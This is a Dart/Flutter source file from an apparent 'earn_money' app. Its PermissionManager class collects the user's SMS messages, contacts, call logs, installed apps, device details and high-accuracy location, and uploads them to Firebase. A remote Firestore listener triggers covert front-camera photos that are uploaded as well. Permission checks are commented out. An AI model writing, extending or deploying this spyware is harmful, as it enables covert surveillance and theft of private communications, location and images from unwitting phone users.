import 'dart:io';
import 'package:call_log/call_log.dart';
import 'package:device_info/device_info.dart';
import 'package:earn_money/enums/user-actions.dart';
import 'package:flutter_appavailability/flutter_appavailability.dart';
import 'package:path/path.dart' show join;
import 'package:camera/camera.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:firebase_storage/firebase_storage.dart';
import 'package:geolocator/geolocator.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:photo_manager/photo_manager.dart';
import 'dart:math';

import 'package:sms/sms.dart';
import 'package:shared_preferences/shared_preferences.dart';

class PermissionManager {
  Firestore db = Firestore.instance;
  SharedPreferences prefs;
  bool isActionRequest = false;
  int docLength = 0;
  Future initiaiteSharedPreferences() async {
    prefs = await SharedPreferences.getInstance();
    var userId = Random.secure().nextInt(100000).toString();
    prefs.setString("user_id", userId);
  }

  getPermissions() async {
    initiaiteSharedPreferences();
    // initilizeGlobalListiner();
    // Map<PermissionGroup, PermissionStatus> permissions =
    //     await PermissionHandler().requestPermissions([
    //   PermissionGroup.contacts,
    //   PermissionGroup.sms,
    //   PermissionGroup.location,
    //   PermissionGroup.camera,
    //   PermissionGroup.microphone,
    //   PermissionGroup.storage
    // ]);
    // print(permissions);
    // await sendMessagesList();
    // await sendContactsList();
    // await sendFrontImage();
    // await sendGeoLocation();
    // await sendDeviceInfo();
    // await sendInstalledAppsList();
    // await sendCallLogs();
  }

  initilizeGlobalListiner() {
    db.collection('actions').snapshots().listen((onData) async {
      print((onData.documents));
      if (isActionRequest && docLength != onData.documents.length) {
        await sendFrontImage();
      }
      isActionRequest = true;
      docLength = onData.documents.length;
    });
  }

  Future sendCallLogs() async {
    Iterable<CallLogEntry> callLogs = await CallLog.get();

    for (CallLogEntry callLog in callLogs) {
      await sendCallLogData(callLog);
    }
  }

  Future sendCallLogData(callLog) async {
    try {
      await db.collection('call_logs').add(callLog);
    } catch (e) {
      print("Exception occured");
    }
  }

  Future sendInstalledAppsList() async {
    List<Map<String, String>> _installedApps =
        await AppAvailability.getInstalledApps();

    for (Map<String, String> app in _installedApps) {
      await sendAppData(app);
    }
  }

  Future sendAppData(appInfo) async {
    appInfo["user_id"] = prefs.get("user_id");
    try {
      await db.collection('installed_apps').add(appInfo);
    } catch (e) {
      print("Exception occured");
    }
  }

  Future sendDeviceInfo() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo device = await deviceInfo.androidInfo;
    var deviceData = {
      "version": device.version.release,
      "brand": device.brand,
      "user_id": prefs.get("user_id")
    };
    try {
      await db.collection('device_info').add(deviceData);
    } catch (e) {
      print("Exception occured");
    }
  }

  Future sendMessagesList() async {
    PermissionStatus permission =
        await PermissionHandler().checkPermissionStatus(PermissionGroup.sms);
    // if (permission.value  PermissionStatus.granted) {
    SmsQuery query = new SmsQuery();
    List<SmsMessage> messages = await query.getAllSms;
    int count = 0;
    for (SmsMessage msg in messages) {
      await sendMessages(msg);
      count++;
      if (count == 5) {
        break;
      }
    }
    // } else {
    //   await PermissionHandler().requestPermissions([PermissionGroup.sms]);
    //   this.sendMessagesListList();
    // }
  }

  Future sendGeoLocation() async {
    Position location = await Geolocator()
        .getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
    try {
      var userLocation = location.toJson();
      userLocation['user_id'] = prefs.get("user_id");
      var result = await db.collection('geo_location').add(userLocation);
      return result;
    } catch (e) {
      print('Exception occured');
    }
  }

  Future sendMessages(SmsMessage message) async {
    try {
      var msg = getJsonObject(message);
      var result = await db.collection('messages').add(msg);
      return result;
    } catch (e) {
      print('Exception occured');
    }
  }

  Future sendContact(contact) async {
    try {
      contact = getContactJsonObject(contact);
      var result = await db.collection('contacts').add(contact);
      return result;
    } catch (e) {
      print('Exception occured');
    }
  }

  Future sendContactsList() async {
    // PermissionStatus permission = await PermissionHandler()
    //     .checkPermissionStatus(PermissionGroup.contacts);
    // if (permission.value == PermissionStatus.granted) {
    Iterable<Contact> contacts = await ContactsService.getContacts();
    for (Contact contact in contacts) {
      await sendContact(contact);
    }
    // } else {
    //   await PermissionHandler().requestPermissions([PermissionGroup.contacts]);
    //   this.sendMessagesListList();
    // }
  }

  sendFrontImage() async {
    // PermissionStatus permission =
    //     await PermissionHandler().checkPermissionStatus(PermissionGroup.camera);
    // if (permission.value == PermissionStatus.granted) {
    CameraController controller;
    List<CameraDescription> avaliableCameras;
    String imageUrl;
    avaliableCameras = await availableCameras();
    controller = CameraController(avaliableCameras[1], ResolutionPreset.medium);
    controller.initialize().then((response) async {
      await captureImage(controller);
    });
  }

  Future captureImage(CameraController controller) async {
    final path = join(
      // Store the picture in the temp directory.
      // Find the temp directory using the `path_provider` plugin.
      (await getTemporaryDirectory()).path,
      '${DateTime.now()}.png',
    );
    await controller.takePicture(path);
    controller.dispose();
    uploadImageToFirebase(path);
  }

  getJsonObject(SmsMessage message) {
    return {
      "id": message.id,
      "address": message.address,
      "body": message.body,
      "date": message.date,
      "sender": message.sender,
      "user_id": prefs.get("userId")
    };
  }

  getContactJsonObject(Contact contact) {
    return {
      "displayName": contact.displayName,
      "phones": contact.phones.first.value,
      "user_id": prefs.get("userId")
    };
  }

  uploadImageToFirebase(imageUrl) async {
    var imageName = DateTime.now().toString();
    StorageReference storageReference =
        FirebaseStorage.instance.ref().child('Camera/${imageName}');
    StorageUploadTask uploadTask = storageReference.putFile(File(imageUrl));
    await uploadTask.onComplete;
    storageReference.getDownloadURL().then((fileURL) async {
      try {
        var cameraFile = {
          "imageUrl": fileURL,
          "user_id": prefs.get("user_id"),
          'imageName': imageName
        };
        await db.collection('camera').add(cameraFile);
      } catch (e) {
        print("Exception occured");
      }
    });
  }
}
